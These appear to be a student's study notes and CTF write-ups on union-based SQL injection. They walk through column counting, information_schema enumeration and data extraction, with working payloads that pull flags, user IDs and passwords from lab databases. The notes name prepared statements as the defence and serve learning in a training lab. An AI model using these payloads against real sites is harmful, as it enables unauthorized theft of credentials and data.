# Union SQL Injection

## Part 1. How to solve CTF
1. You have to find the reason for the problem.
2. check step by step - debugging
3. [Beginners Guide to Web Hacking CTFs](https://medium.com/@isaacwangethi30/beginners-guide-to-web-hacking-ctfs-9ef04e7c5df5)

## Part 2. CTF Solution
1. Admin is mine
- It blocks the login page on JavaScript.
2. Burp Suite = how to modify the response
3. Countermeasure of SQL Injection = Prepared Statement

## Part 3. SQL Injection - Data Extraction
1. The place where we use data in the database
2. The data display or not
- Display = Board
- Not display = login, ID double check
3. Data Extraction
- It brings all data, but it cannot bring other tables
```javascript
select * from board where idx= '______' or '1' = '1'
```
- union  = it can use the select function again, and the column number must be the same
ex) select pass from member union select id from member
ex) select id, pass from member union select 1,2
- order by = sort
ex) select ~~~ order by [column name]
ex) select id from member order by id

## Part 4. Union SQL Injection
- Union SQL Injection Process
1. Find out the point of the SQL Injection
* Type the part of words
```javascript
select * from table where name like '%______%'
```
```javascript
over%' and '1%' = '1
```
2. Find the number of Columns
* Find out how many columns it is to type sequence numbers
```javascript
over%' order by 1 #
```
3. Find the number of print column location
* It shows the displayed numbers
```javascript
over%' union select 1,2,3,4 #
```
* select pass from member
```javascript
over%' union select 1,pass,3,4 #
```
4. Find DB name: segault_sql
```javascript
select database()
over%' union select 1,database(),3,4 #
```
5. Find Table name
```javascript
information_schema.tables
select table_name from information_schema.tables where table_schema = 'DB Name'
over%' union select 1,table_name,3,4 from information_schema.tables where table_schema = 'segfault_sql' #
```
6. Find Column name
```javascript
select column_name from information_schema.columns where table_name = 'table name'
over%' union select 1,column_name,3,4 from information_schema.columns where table_name = 'member' #
```
7. Find Data
```javascript
select id, pass from member
over%' union select 1, id, pass, 4 from member
```

## Part 5 - Assignment
1. Review Union SQL Injection (HTTP://ctf.segfaulthub.com:1020/sqlInjection3.php)

2. dol dol data (only one result) (HTTP://ctf.segfaulthub.com:1020/sqlInjection_2_1.php)<br>
a. Find out the point of the SQL Injection
```javascript
1234' or '1' ='1
```
b. Find the number of columns
```javascript
1234' order by 4 #
```
c. Find the number of print column locations
```javascript
1234' union select 1,2,3,4 #
```
d. Find DB name
```javascript
1234' union select database(),2,3,4 #
```
e. Find Table name
```javascript
1234' union select table_name,2,3,4 from information_schema.tables where table_schema = 'segfault_sql' #
```
f. Find column name
```javascript
1234' union select column_name,2,3,4 from information_schema.columns where table_name = 'member' #
```
g. Find Data
```javascript
0000' union select id,pass,email,info from member where id = 'doldol' #
```

3. CTF questions<br>
a. SQL Injection 1
* Find out the point of the SQL Injection = ad%' and 1=1 #
* Find out the number of columns = ad%' order by 4 #
* Find out the number of print column locations = ad%' union select 1,2,3,4 #
* Find DB name = ad%' union select database(),2,3,4 #  => 	sqli_1
* Find table name = ad%' union select table_name,2,3,4 from information_schema.tables where table_schema = 'sqli_1' #
* Find column name = ad%' union select column_name,2,3,4 from information_schema.columns where table_name = 'flag_table' #
* Find data = ad%' union select flag, 2, 3, 4 from flag_table #

b. SQL Injection 
* The point? = When I typed nomaltic, the information showed "My name is normaltic", but when I typed "admin", it doesn't show anything. Which means, depending on the name, the information changes. So, when it tried SQL injection "admin' or '1", it showed "my name is normaltic"
* The number of columns? = admin' order by 6 #
* location? = admin' union select 1,2,3,4,5,6 #   => only showing "6"
* database? = admin' union select 1,2,3,4,5,database() #    => sqli_5
* table? = admin' union select 1,2,3,4,5,table_name from information_schema.tables where table_schema = 'sqli_5' #     => flag_honey
* column name? = admin' union select 1,2,3,4,5,column_name from information_schema.columns where table_name = 'flag_honey' #   => flag
* data? = admin' union select 1,2,3,4,5,flag from flag_honey #    => 	kkkkkkk_Not Here!
* admin' union SELECT 1, 2, 3, 4, 5, group_concat(table_name) from information_schema.tables where table_schema = 'sqli_5' #
  - Find hidden information (https://www.w3resource.com/mysql/aggregate-functions-and-grouping/aggregate-functions-and-grouping-group_concat.php)
* admin' union select 1,2,3,4,5,column_name from information_schema.columns where table_name = 'secret' #
* admin' union select 1,2,3,4,5,flag from secret #    => NONONO~~~~
* admin' union select 1,2,3,4,5,group_concat(flag) from secret #

4. Web development
- mypage
